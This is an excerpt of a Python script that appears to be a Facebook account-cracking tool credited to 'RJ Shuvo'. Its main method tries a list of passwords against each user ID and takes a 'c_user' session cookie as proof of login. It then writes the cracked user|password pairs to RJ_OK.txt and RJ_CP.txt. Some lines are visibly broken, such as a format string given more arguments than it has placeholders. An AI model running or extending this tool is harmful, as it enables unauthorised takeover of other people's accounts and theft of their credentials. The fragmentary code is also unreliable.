...
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           RJ Shuvo
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          RJ Shuvo
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           RJ-Shuvo
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRJ_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRJ_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back RJ Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[RJ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [RJ-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('RJ_CP.txt' , 'a').write('%s\n' % wrt)
                        break
